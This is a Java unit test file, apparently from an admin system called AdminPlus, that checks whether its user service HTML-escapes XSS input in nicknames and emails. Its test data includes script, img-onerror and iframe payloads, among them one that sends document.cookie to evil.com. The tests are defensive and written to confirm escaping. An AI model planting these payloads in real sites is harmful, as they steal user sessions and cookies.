package com.adminplus.service;

import com.adminplus.pojo.dto.request.UserCreateRequest;
import com.adminplus.pojo.dto.request.UserUpdateRequest;
import com.adminplus.pojo.dto.response.UserResponse;
import com.adminplus.pojo.entity.UserEntity;
import com.adminplus.repository.DeptRepository;
import com.adminplus.repository.RoleRepository;
import com.adminplus.repository.UserRepository;
import com.adminplus.repository.UserRoleRepository;
import com.adminplus.service.impl.UserServiceImpl;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.core.convert.ConversionService;
import org.springframework.security.crypto.password.PasswordEncoder;

import java.util.List;
import java.util.Optional;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.*;

/**
 * UserService XSS 防护验证测试
 * <p>
 * 真实测试：验证包含 XSS payload 的输入被转义后存储
 *
 * @author AdminPlus
 * @since 2026-04-05
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("UserService XSS 防护验证测试")
class UserServiceXssVerificationTest {

    @Mock
    private UserRepository userRepository;

    @Mock
    private UserRoleRepository userRoleRepository;

    @Mock
    private RoleRepository roleRepository;

    @Mock
    private DeptRepository deptRepository;

    @Mock
    private DeptService deptService;

    @Mock
    private PasswordEncoder passwordEncoder;

    @Mock
    private com.adminplus.service.LogService logService;

    @Mock
    private ConversionService conversionService;

    @InjectMocks
    private UserServiceImpl userService;

    private UserEntity testUser;
    private UserResponse testUserResponse;

    @BeforeEach
    void setUp() {
        testUser = new UserEntity();
        testUser.setId("user-001");
        testUser.setUsername("testuser");
        testUser.setPassword("encoded-password");
        testUser.setNickname("Test User");
        testUser.setEmail("test@example.com");
        testUser.setPhone("13800138000");
        testUser.setStatus(1);

        testUserResponse = new UserResponse(
                testUser.getId(),
                testUser.getUsername(),
                testUser.getNickname(),
                testUser.getEmail(),
                testUser.getPhone(),
                null,
                testUser.getStatus(),
                testUser.getDeptId(),
                null,
                List.of(),
                testUser.getCreateTime(),
                testUser.getUpdateTime()
        );

        // Mock conversionService
        lenient().when(conversionService.convert(any(UserEntity.class), eq(UserResponse.class)))
                .thenReturn(testUserResponse);
    }

    @Nested
    @DisplayName("创建用户时 XSS 防护验证")
    class CreateUserXssVerificationTests {

        @Test
        @DisplayName("创建用户时 nickname 包含 XSS 应被转义")
        void shouldEscapeXssInNicknameWhenCreateUser() {
            // Given
            String xssNickname = "<script>alert('xss')</script>";
            UserCreateRequest req = new UserCreateRequest(
                    "xssuser01",
                    "Password123!",
                    xssNickname,
                    "test@test.com",
                    "13800138001",
                    null,
                    null
            );

            when(userRepository.existsByUsername(anyString())).thenReturn(false);
            when(passwordEncoder.encode(anyString())).thenReturn("encoded-password");
            when(userRepository.save(any(UserEntity.class))).thenAnswer(inv -> {
                UserEntity user = inv.getArgument(0);
                user.setId("new-user-id");
                return user;
            });

            // When
            userService.createUser(req);

            // Then - 验证 save 的用户不包含原始 XSS
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            // 关键验证：script 标签被转义了
            assertThat(savedUser.getNickname()).doesNotContain("<script>");
            assertThat(savedUser.getNickname()).contains("&lt;script&gt;");
        }

        @Test
        @DisplayName("创建用户时 email 包含 XSS 应被转义")
        void shouldEscapeXssInEmailWhenCreateUser() {
            // Given
            String xssEmail = "<img src=x onerror=alert(1)>@test.com>";
            UserCreateRequest req = new UserCreateRequest(
                    "xssuser02",
                    "Password123!",
                    "Test User",
                    xssEmail,
                    "13800138002",
                    null,
                    null
            );

            when(userRepository.existsByUsername(anyString())).thenReturn(false);
            when(passwordEncoder.encode(anyString())).thenReturn("encoded-password");
            when(userRepository.save(any(UserEntity.class))).thenAnswer(inv -> {
                UserEntity user = inv.getArgument(0);
                user.setId("new-user-id");
                return user;
            });

            // When
            userService.createUser(req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getEmail()).doesNotContain("<img");
            assertThat(savedUser.getEmail()).contains("&lt;img");
        }
    }

    @Nested
    @DisplayName("更新用户时 XSS 防护验证")
    class UpdateUserXssVerificationTests {

        @Test
        @DisplayName("更新用户时 nickname 包含 XSS 应被转义")
        void shouldEscapeXssInNicknameWhenUpdateUser() {
            // Given
            String xssNickname = "<iframe src=javascript:alert(1)></iframe>XSS";
            UserUpdateRequest req = new UserUpdateRequest(
                    xssNickname,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getNickname()).doesNotContain("<iframe>");
            assertThat(savedUser.getNickname()).contains("&lt;iframe");
        }

        @Test
        @DisplayName("更新用户时 email 包含 HTML 字符应被转义")
        void shouldEscapeHtmlCharsInEmailWhenUpdateUser() {
            // Given
            String htmlEmail = "<>&\"'test@test.com";
            UserUpdateRequest req = new UserUpdateRequest(
                    null,
                    htmlEmail,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getEmail()).doesNotContain("<");
            assertThat(savedUser.getEmail()).contains("&lt;");
        }
    }

    @Nested
    @DisplayName("边界条件验证")
    class EdgeCaseVerificationTests {

        @Test
        @DisplayName("空字符串应正确处理")
        void shouldHandleEmptyString() {
            // Given
            UserUpdateRequest req = new UserUpdateRequest(
                    "",  // 空字符串
                    null,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getNickname()).isEqualTo("");
        }

        @Test
        @DisplayName("null 值应保持原值")
        void shouldKeepOriginalValueForNull() {
            // Given
            UserUpdateRequest req = new UserUpdateRequest(
                    null,  // 不更新
                    null,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getNickname()).isEqualTo("Test User");
        }
    }

    @Nested
    @DisplayName("真实 XSS 攻击场景验证")
    class RealWorldXssAttackVerificationTests {

        @Test
        @DisplayName("存储型 XSS：验证 script 标签被转义")
        void shouldEscapeScriptTagForStoredXss() {
            // Given
            String storedXss = "<script>fetch('https://evil.com?c='+document.cookie)</script>";
            UserUpdateRequest req = new UserUpdateRequest(
                    storedXss,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            // 关键验证：script 标签被转义
            assertThat(savedUser.getNickname()).doesNotContain("<script>");
            assertThat(savedUser.getNickname()).doesNotContain("</script>");
            assertThat(savedUser.getNickname()).contains("&lt;");
        }

        @Test
        @DisplayName("反射型 XSS：验证 img 标签被转义")
        void shouldEscapeImgTagForReflectedXss() {
            // Given
            String reflectedXss = "<img src=x onerror=\"alert('XSS')\">";
            UserUpdateRequest req = new UserUpdateRequest(
                    reflectedXss,
                    null,
                    null,
                    null,
                    null,
                    null
            );

            when(userRepository.findById("user-001")).thenReturn(Optional.of(testUser));
            when(userRepository.save(any(UserEntity.class))).thenReturn(testUser);

            // When
            userService.updateUser("user-001", req);

            // Then
            var userCaptor = org.mockito.ArgumentCaptor.forClass(UserEntity.class);
            verify(userRepository).save(userCaptor.capture());

            UserEntity savedUser = userCaptor.getValue();
            assertThat(savedUser.getNickname()).doesNotContain("<img");
            assertThat(savedUser.getNickname()).contains("&lt;img");
        }
    }
}
